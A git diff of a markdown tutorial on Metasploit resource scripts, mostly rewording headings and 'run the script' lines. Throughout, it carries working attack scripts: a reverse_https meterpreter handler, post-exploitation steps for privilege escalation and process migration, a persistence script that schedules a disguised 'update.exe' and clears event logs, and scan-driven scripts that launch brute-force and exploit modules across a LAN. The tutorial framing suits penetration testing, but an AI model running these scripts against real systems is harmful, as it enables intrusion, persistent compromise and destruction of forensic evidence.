@@ -68,7 +68,7 @@ Open your text editor and copy/past the follow two metasploit core commands to i
 
 <br />
 
-Next example show us how to use msfconsole makerc core command to write our resource script.
+The next example show us how to use msfconsole makerc core command to write our resource script.
 ```
    kali > msfconsole
    msf > version
@@ -80,8 +80,7 @@ Next example show us how to use msfconsole makerc core command to write our reso
 
 <blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days later we dont remmenber the handler configurations set that day, thats one<br />of the reasons rc scripting can be usefull, besides automating the framework (erb scripting can access metasploit api).</blockquote>
 
-- **Resource file to start one handler::**`[script: handler.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **handler.rc**
 ```
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_https
@@ -90,12 +89,11 @@ Next example show us how to use msfconsole makerc core command to write our reso
    set LPORT 666
    exploit
 ```
-`[run]` msfconsole -r /root/handler.rc
+**Run the script:** msfconsole -r /root/handler.rc
 
 <br />
 
-- **Using makerc metasploit core command to build::**`[script: handler.rc]`<br />
-
+The next example show us how to use msfconsole makerc core command to write our resource script.
 ```
    kali > msfconsole
    msf > use exploit/multi/handler
@@ -104,26 +102,25 @@ Next example show us how to use msfconsole makerc core command to write our reso
    msf exploit(multi/handler) > set LHOST 192.168.1.71
    msf exploit(multi/handler) > set LPORT 666
    msf exploit(multi/handler) > exploit
-
    msf exploit(multi/handler) > makerc /root/handler.rc
 ```
-`[run] msf >` resource /root/handler.rc
+**Run the script:** resource /root/handler.rc
 
 <br /><br />
 
 <blockquote>The next resource script allow us to record msfconsole activity under logfile.log and commands.rc<br />It also displays database information sutch as: framework version, active sessions in verbose mode, loads my auxiliary scripts local directory into msfdb (loading my modules) and executes the rc script handler.rc at msfconsole startup.</blockquote>
 
-- **Resource file to record session activity, load my auxiliarys and exec handler.rc::**`[script: record.rc]`<br />
 
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **record.rc**
 ```
    spool /root/logfile.log
+   loadpath /root/msf-auxiliarys
    version
    sessions -v
-     loadpath /root/msf-auxiliarys
-     resource /root/handler.rc
+   resource /root/handler.rc
    makerc /root/commands.rc
 ```
-`[run]` msfconsole -r /root/record.rc
+**Run the script:** msfconsole -r /root/record.rc
 
 ![gif](http://i68.tinypic.com/343oefb.gif)
 
@@ -138,8 +135,7 @@ Next example show us how to use msfconsole makerc core command to write our reso
 ## RESOURCE SCRIPTS IN POST EXPLOITATION
 <blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time.</blockquote>
 
-- **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[script: post.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **post.rc**
 ```
    getprivs
    getsystem
@@ -150,14 +146,13 @@ Next example show us how to use msfconsole makerc core command to write our reso
      use post/multi/recon/local_exploit_suggester
    run
 ```
-`[run] meterpreter >` resource /root/post.rc
+**Run the script:** resource /root/post.rc
 
 <br /><br />
 
 <blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically. This next example demonstrates how to use resource scripts to successfully persiste a payload in target system and clean tracks (timestomp & clearev).</blockquote>
 
-- **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[persistence.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **persistence.rc**
 ```
  getprivs
  getsystem
@@ -168,14 +163,13 @@ Next example show us how to use msfconsole makerc core command to write our reso
   scheduleme -m 10 -c "%temp%\\update.exe"
  clearev
 ```
-`[run] meterpreter >` resource /root/persistence.rc
+**Run the script:** resource /root/persistence.rc
 
 <br /><br />
 
 <blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using SETG (global variable declarations) to configurate all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The next rc script will run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>
 
-- **Using SETG global variable to config auxiliary(s) modules options::**`[script: http_brute.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **http_brute.rc**
 ```
    setg THREADS 15
    setg RHOSTS 192.168.1.254
@@ -187,7 +181,7 @@ Next example show us how to use msfconsole makerc core command to write our reso
    run
    unsetg RHOSTS THREADS
 ```
-`[run]` msfconsole -r /root/http_brute.rc
+**Run the script:** msfconsole -r /root/http_brute.rc
 
 ![gif](http://i66.tinypic.com/2usid92.gif)
 
@@ -202,8 +196,7 @@ Next example show us how to use msfconsole makerc core command to write our reso
 ## RESOURCE SCRIPTS IN AutoRunScript
 <blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole 'AutoRunScript' handler flag, for this to work we need to define a global variable (setg RESOURCE /root/gather.rc) to call our resource script at session creation.</blockquote>
 
-- **RC::Post-Exploit::Script::Gather::**`[script: gather.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **gather.rc**
 ```
    sysinfo
    getuid
@@ -211,8 +204,7 @@ Next example show us how to use msfconsole makerc core command to write our reso
    sessions -v
 ```
 
-- **RC::AutoRunScript::Handler::**`[script: post_handler.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **post_handler.rc**
 ```
    setg RESOURCE /root/gather.rc
       use exploit/multi/handler
@@ -224,7 +216,7 @@ Next example show us how to use msfconsole makerc core command to write our reso
    exploit
    unsetg RESOURCE
 ```
-`[run]` msfconsole -r /root/post_handler.rc
+**Run the script:** msfconsole -r /root/post_handler.rc
 
 <br /><br />
 
@@ -246,8 +238,7 @@ Next example show us how to use msfconsole makerc core command to write our reso
 ## USING RUBY IN RC (ERB scripting)
 <blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple msfconsole or meterpreter commands together with ruby syntax or metasploit APIs.</blockquote>
 
-- **Running ruby code inside resource files::**`[script: template.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **template.rc**
 ```
 <ruby>
    help = %Q|
@@ -276,14 +267,13 @@ Next example show us how to use msfconsole makerc core command to write our reso
     run_single("db_export -f xml template.xml")
 </ruby>
 ```
-`[run]` msfconsole -r /root/template.rc
+**Run the script:** msfconsole -r /root/template.rc
 
 <br /><br />
 
 <blockquote>The next resource script uses db_nmap metasploit core command to populate the msfdb database with hosts (address), then the ruby function will check what hosts has been capture and run 3 post-exploitation modules againts all hosts stored inside the msfdb database.</blockquote>
 
-- **Scan local lan with nmap and run auxiliary(s)::**`[script: http_title.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **http_recon.rc**
 ```
 db_nmap -sV -Pn -T4 -p 80 --open --reason 192.168.1.0/24
 services
@@ -309,14 +299,13 @@ services
    </ruby>
 unsetg RHOSTS
 ```
-`[run]` msfconsole -r /root/http_title.rc
+**Run the script:** msfconsole -r /root/http_recon.rc
 
 <br /><br />
 
 <blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system.</blockquote>
 
-- **Run auxiliary/exploit modules based on database (targets) ports found::**`[script: recon.rc]`<br />
-
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **scanner.rc**
 ```
 db_nmap -sV -Pn -T4 -p 21,80,445 --open --reason 192.168.1.0/24
 services
@@ -367,12 +356,12 @@ services
    </ruby>
 unsetg RHOSTS
 ```
-`[run]` msfconsole -r /root/recon.rc
+**Run the script:** msfconsole -r /root/scanner.rc
 
 <br /><br />
 
-- **snmp_enum::post::exploitation::**`[script: snmp_enum.rc]`<br />
 
+Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **snmp_enum.rc**
 ```
 setg RHOSTS 192.168.1.71 192.168.1.254
    <ruby>
@@ -400,7 +389,7 @@ setg RHOSTS 192.168.1.71 192.168.1.254
    </ruby>
 unsetg RHOSTS
 ```
-`[run]` msfconsole -r /root/snmp_enum.rc
+**Run the script:** msfconsole -r /root/snmp_enum.rc
 
 <br />
 
